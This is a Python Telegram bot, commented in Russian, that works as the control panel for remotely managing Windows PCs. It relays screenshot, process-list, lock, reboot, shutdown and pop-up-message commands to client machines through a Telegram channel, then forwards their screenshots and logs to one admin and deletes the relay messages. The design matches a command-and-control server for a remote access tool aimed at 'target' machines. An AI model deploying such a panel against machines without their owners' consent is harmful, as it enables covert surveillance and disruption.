import asyncio
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 5153650495  # Твой ID

# СЮДА НАПИШИ ЮЗЕРНЕЙМ СВОЕГО КАНАЛА БЕЗ СИМВОЛА @
CHANNEL_USERNAME = "gjjgfjjgujgujugjugju3535454666" 

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Временная база данных для хранения ПК, которые прислали сигнал
connected_pcs = {}

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if not is_admin(message.from_user.id): return
    await message.answer("🤖 Пульт администратора Windows готов.\n\n/devices — Открыть список устройств")

@dp.message(Command("devices"))
async def cmd_devices(message: types.Message):
    if not is_admin(message.from_user.id): return
    if not connected_pcs:
        await message.answer("❌ Список устройств пуст. Запустите клиент на целевом ПК.")
        return
        
    keyboard = [[InlineKeyboardButton(text=f"💻 {info['name']}", callback_data=f"manage_{dev_id}")] for dev_id, info in connected_pcs.items()]
    await message.answer("🎛 Выберите устройство для управления:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))

@dp.callback_query(F.data.startswith("manage_"))
async def manage_device(callback: types.CallbackQuery):
    device_id = callback.data.split("_")[1]
    device_info = connected_pcs.get(device_id)
    if not device_info:
        await callback.answer("❌ Устройство оффлайн или не найдено.")
        return
        
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Инфо и Мониторинг", callback_data=f"cat_mon_{device_id}")],
        [InlineKeyboardButton(text="⚙️ Системные действия", callback_data=f"cat_sys_{device_id}")],
        [InlineKeyboardButton(text="🌐 Открытие ресурсов", callback_data=f"cat_web_{device_id}")],
        [InlineKeyboardButton(text="🛠 Утилиты и Приложения", callback_data=f"cat_util_{device_id}")],
        [InlineKeyboardButton(text="⬅️ Назад к списку", callback_data="back_to_list")]
    ])
    await callback.message.edit_text(text=f"💻 Управление ПК: *{device_info['name']}*\n🆔 ID: `{device_id}`", parse_mode="Markdown", reply_markup=keyboard)

# Хэндлеры категорий меню
@dp.callback_query(F.data.startswith("cat_mon_"))
async def cat_monitoring(callback: types.CallbackQuery):
    dev_id = callback.data.split("_")[2]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📸 Сделать скриншот", callback_data=f"cmd_screen_{dev_id}")],
        [InlineKeyboardButton(text="📋 Список процессов", callback_data=f"cmd_tasklist_{dev_id}")],
        [InlineKeyboardButton(text="🔊 Звук на максимум", callback_data=f"cmd_volmax_{dev_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data=f"manage_{dev_id}")]
    ])
    await callback.message.edit_text(text="📊 **Инфо и Мониторинг**", parse_mode="Markdown", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("cat_sys_"))
async def cat_system(callback: types.CallbackQuery):
    dev_id = callback.data.split("_")[2]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔒 Заблокировать экран", callback_data=f"cmd_lock_{dev_id}")],
        [InlineKeyboardButton(text="🌙 В спящий режим", callback_data=f"cmd_sleep_{dev_id}")],
        [InlineKeyboardButton(text="🔄 Перезагрузить ПК", callback_data=f"cmd_reboot_{dev_id}")],
        [InlineKeyboardButton(text="🛑 Выключить ПК", callback_data=f"cmd_shutdown_{dev_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data=f"manage_{dev_id}")]
    ])
    await callback.message.edit_text(text="⚙️ **Системные действия**", parse_mode="Markdown", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("cat_web_"))
async def cat_web(callback: types.CallbackQuery):
    dev_id = callback.data.split("_")[2]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🌐 Открыть YouTube", callback_data=f"cmd_yt_{dev_id}")],
        [InlineKeyboardButton(text="🔍 Открыть Google", callback_data=f"cmd_google_{dev_id}")],
        [InlineKeyboardButton(text="💬 Вывести Сообщение", callback_data=f"cmd_msg_{dev_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data=f"manage_{dev_id}")]
    ])
    await callback.message.edit_text(text="🌐 **Открытие ресурсов и медиа**", parse_mode="Markdown", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("cat_util_"))
async def cat_utilities(callback: types.CallbackQuery):
    dev_id = callback.data.split("_")[2]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🧮 Запустить Калькулятор", callback_data=f"cmd_calc_{dev_id}")],
        [InlineKeyboardButton(text="📝 Запустить Блокнот", callback_data=f"cmd_notepad_{dev_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data=f"manage_{dev_id}")]
    ])
    await callback.message.edit_text(text="🛠 **Запуск встроенных утилит**", parse_mode="Markdown", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("cmd_"))
async def send_command(callback: types.CallbackQuery):
    """Бот публикует команду в твой канал"""
    _, cmd_type, device_id = callback.data.split("_", 2)
    
    # Отправляем в канал пост формата: CMD:ID_устройства:ИМЯ_КОМАНДЫ
    try:
        await bot.send_message(chat_id=f"@{CHANNEL_USERNAME}", text=f"CMD:{device_id}:{cmd_type}")
        await callback.answer("🚀 Команда отправлена в канал!")
    except Exception as e:
        await callback.answer(f"❌ Ошибка отправки в канал. Бот админ там?")

@dp.callback_query(F.data == "back_to_list")
async def back_to_list(callback: types.CallbackQuery):
    await callback.message.delete()
    await cmd_devices(callback.message)


# Прием отчетов от клиента (Логирование пингов, скриншотов, процессов)
@dp.message(F.text.startswith("PING:"))
async def handle_client_ping(message: types.Message):
    """Клиент сообщает, что он живой"""
    try:
        _, device_id, pc_name = message.text.split(":")
        if device_id not in connected_pcs:
            connected_pcs[device_id] = {"name": pc_name}
            await bot.send_message(chat_id=ADMIN_ID, text=f"🔔 **Новый ПК обнаружен онлайн!**\nИмя: `{pc_name}`\nID: `{device_id}`", parse_mode="Markdown")
        await message.delete()
    except: pass

@dp.message(F.document & F.caption.startswith("SCREEN_REPLY:"))
async def receive_screenshot(message: types.Message):
    """Скриншот от удаленного ПК"""
    try:
        device_id = message.caption.split(":")[1]
        pc_name = connected_pcs.get(device_id, {}).get("name", "Неизвестный ПК")
        
        file_id = message.document.file_id
        file = await bot.get_file(file_id)
        file_buffer = await bot.download_file(file.file_path)
        
        input_file = BufferedInputFile(file_buffer.read(), filename="screenshot.png")
        await bot.send_photo(chat_id=ADMIN_ID, photo=input_file, caption=f"📸 Скриншот с ПК: *{pc_name}*", parse_mode="Markdown")
        await message.delete()
    except: pass

@dp.message(F.text.startswith("LOG_REPLY:"))
async def receive_log_reply(message: types.Message):
    """Прием текстовых списков процессов"""
    try:
        text_data = message.text.replace("LOG_REPLY:", "")
        await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown")
        await message.delete()
    except: pass

async def main():
    print("[СЕРВЕР] Бот запущен на бот-хостинге!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
